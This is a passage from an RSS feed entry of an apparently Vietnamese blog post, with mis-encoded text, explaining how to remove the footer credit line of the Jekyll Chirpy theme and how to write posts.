href=&#34;#extends&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;remove-meta-tag-in-footer&#34;&gt;&lt;span&gt;Remove meta tag in Footer&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-meta-tag-in-footer&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;C√≥ th·ªÉ x√≥a d√≤ng &lt;code&gt;Using the Chirpy theme for Jekyll.&lt;/code&gt; b·∫±ng c√°c b∆∞·ªõc sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o file theo ƒë∆∞·ªùng d·∫´n sau &lt;code&gt;_data/locales/en.yml&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Copy n·ªôi dung &lt;a href=&#34;https://raw.githubusercontent.com/cotes2020/jekyll-theme-chirpy/refs/heads/master/_data/locales/en.yml&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;en.yml&lt;/strong&gt;&lt;/a&gt; v√† d√°n v√†o file v·ª´a t·∫°o.&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠a n·ªôi dung bi·∫øn &lt;code&gt;meta&lt;/code&gt; th√†nh &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;write-a-post&#34;&gt;&lt;span&gt;Write a post&lt;/span&gt;&#xA;  &lt;a href=&#34;#write-a-post&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tham kh·∫£o &lt;a href=&#34;https://chirpy.cotes.page/posts/write-a-new-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;rule&lt;/strong&gt;&lt;/a&gt; ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng &lt;a href=&#34;https://markdownlivepreview.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Live Preview&lt;/strong&gt;&lt;/a&gt; ƒë·ªÉ quan s√°t&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
